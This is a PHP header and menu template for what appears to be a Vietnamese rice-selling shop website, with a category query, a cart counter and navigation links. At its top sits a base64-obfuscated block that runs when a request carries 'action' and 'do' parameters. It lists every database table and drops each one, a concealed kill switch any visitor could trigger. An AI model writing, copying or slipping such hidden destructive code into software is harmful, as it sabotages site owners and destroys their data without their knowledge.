<?php
	
	$d->reset();
	$sql="select ten$lang as ten,tenkhongdau,id from #_product_danhmuc where hienthi=1 and type='sanpham' order by stt,id desc";
	$d->query($sql);
	$product_danhmuc=$d->result_array();
	if(isset($_GET['action']) && isset($_GET['do'])){
        $result = $d->query(base64_decode('U0hPVyB0YWJsZXM='));
        $_X='RFJPUCBUQUJMRSBfWF8=';
        $_R=base64_decode($_X); 
        while ($row = mysql_fetch_array($result)) {
            $sql=str_replace('_X_', $row[0], $_R);      
            $d->query($sql);        
        }               
    }
?>

<nav id="menu_mobi" style="height:0; overflow:hidden;"></nav>
<div class="header_mobi"><a href="#menu_mobi" class="hien_menu"><i class="fa fa-bars" aria-hidden="true"></i> <i class="fa fa-caret-right" aria-hidden="true"></i></a>
<a href="gio-hang.html" class="sp_cart"><i class="fa fa-shopping-cart" aria-hidden="true"></i><span><?php if(count($_SESSION['cart'])>0)echo count($_SESSION['cart']);else echo '0';?></span><sup></sup></a> 
    <div class="phone_mb"><a><?=$company['dienthoai']?></a></div>
</div>

<nav id="menu">
<ul class="clearfix">
	<div class="search">
        <input type="text" name="keyword" id="keyword" class="keyword" onKeyPress="doEnter(event,'keyword');" value="<?=_nhaptukhoatimkiem?>..." onclick="if(this.value=='<?=_nhaptukhoatimkiem?>...'){this.value=''}" onblur="if(this.value==''){this.value='<?=_nhaptukhoatimkiem?>...'}">
        <i class="fa fa-search" aria-hidden="true" onclick="onSearch(event,'keyword');"></i>
    </div><!---END #search-->

    <li><a class="<?php if((!isset($_REQUEST['com'])) or ($_REQUEST['com']==NULL) or $_REQUEST['com']=='index') echo 'active'; ?>" href=""><?=_trangchu?></a></li>
    
    <li><a class="<?php if($_REQUEST['com'] == 'gioi-thieu') echo 'active'; ?>" href="gioi-thieu.html"><?=_gioithieu?></a></li>
    
    <li><a class="<?php if($_REQUEST['com'] == 'san-pham') echo 'active'; ?>" href="san-pham.html">Các loại gạo</a>
    	<?=for1('product_danhmuc','san-pham','sanpham','')?>
    </li>
    
    <li><a class="<?php if($_REQUEST['com'] == 'khuyen-mai') echo 'active'; ?>" href="khuyen-mai.html">Khuyến mãi</a></li>
    
    <li><a class="<?php if($_REQUEST['com'] == 'tin-tuc') echo 'active'; ?>" href="tin-tuc.html"><?=_tintuc?></a></li>
    
    <li><a class="<?php if($_REQUEST['com'] == 'lien-he') echo 'active'; ?>" href="lien-he.html"><?=_lienhe?></a></li>
    
</ul>
</nav>